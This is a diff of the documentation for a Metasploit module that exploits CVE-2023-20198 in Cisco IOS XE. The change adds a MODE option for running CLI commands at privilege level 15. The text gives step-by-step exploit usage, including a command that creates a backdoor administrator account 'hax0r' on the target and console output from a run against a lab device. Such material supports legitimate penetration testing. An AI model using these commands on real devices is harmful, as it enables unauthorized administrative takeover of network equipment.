@@ -2,12 +2,11 @@
 This module leverages CVE-2023-20198 against vulnerable instances of Cisco IOS XE devices which have the
 Web UI exposed. An attacker can execute arbitrary CLI commands with privilege level 15.
 
-By default [CLI commands](https://www.cisco.com/E-Learning/bulk/public/tac/cim/cib/using_cisco_ios_software/02_cisco_ios_hierarchy.htm)
-are run in the Global configuration mode. To drop down to Privileged EXEC mode, you can preface your command
-with the `exit` keyword followed by an (escaped) newline, e.g. To run the command `show version` in Privileged
-EXEC mode, the CMD must be `exit\\nshow version`. To drop to User EXEC mode you can preface your command with
-two `exit` keywords, e.g. `exit\\nexit\\nshow ip interface brief`. To run a command in Global configuration
-mode, just set the `CMD` option to the command you want to run, e.g. `username hax0r privilege 15 password hax0r`.
+You must specify the IOS command mode to execute a CLI command in. Valid modes are `user`, `privileged`, and
+`global`. To run a command in "Privileged" mode, set the `CMD` option to the command you want to run,
+e.g. `show version` and set the `MODE` to `privileged`.  To run a command in "Global Configuration" mode, set
+the `CMD` option to the command you want to run,  e.g. `username hax0r privilege 15 password hax0r` and set
+the `MODE` to `global`.
 
 The vulnerable IOS XE versions are:
 
@@ -58,8 +57,20 @@ Or
 2. `use auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198`
 3. `set RHOST <TARGET_IP_ADDRESS>`
 4. `set CMD "username hax0r privilege 15 secret hax0r"`
-5. `run`
-6. Visit `https://<TARGET_IP_ADDRESS>/webui/` in a browser and log in with username `hax0r` and password `hax0r`.
+5. `set MODE global`
+6. `run`
+7. Visit `https://<TARGET_IP_ADDRESS>/webui/` in a browser and log in with username `hax0r` and password `hax0r`.
+
+## Options
+
+### CMD
+
+The Cisco CLI command to execute.
+
+### MODE
+Cisco IOS commands cna be executed in one of several modes, specifically "User EXEC" mode, "Privileged EXEC" mode, and 
+"Global Configuration" mode. The `MODE` options lets you explicitly set what mode you want the `CMD` to execute in. Valid
+modes are `user`, `privileged`, and `global`.
 
 ## Scenarios
 
@@ -67,20 +78,23 @@ Or
 msf6 > use auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198
 msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > set RHOST 192.168.86.57
 RHOST => 192.168.86.57
-msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > set CMD "exit\\nshow version"
-CMD => exit\nshow version
+msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > set CMD "show version"
+CMD => show version
+msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > set MODE privileged
+MODE => privileged
 msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > show options
 
 Module options (auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198):
 
-   Name     Current Setting     Required  Description
-   ----     ---------------     --------  -----------
-   CMD      exit\nshow version  yes       The Global configuration CLI command to execute. To drop to Privileged EXEC mode, preface your CMD with exit\\n, e.g "exit\\nshow version"
-   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS   192.168.86.57       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT    443                 yes       The target port (TCP)
-   SSL      true                no        Negotiate SSL/TLS for outgoing connections
-   VHOST                        no        HTTP server virtual host
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CMD      show version     yes       The CLI command to execute.
+   MODE     privileged       yes       The mode to execute the CLI command in, valid values are 'user', 'privileged', or 'global'.
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   192.168.86.57    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    443              yes       The target port (TCP)
+   SSL      true             no        Negotiate SSL/TLS for outgoing connections
+   VHOST                     no        HTTP server virtual host
 
 
 View the full module info with the info, or info -d command.
@@ -135,7 +149,7 @@ Processor board ID 9OVFUOGPESO
 Configuration register is 0x2102
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run CMD="exit\\nshow clock"
+msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run CMD="show clock"
 [*] Running module against 192.168.86.57
 
 
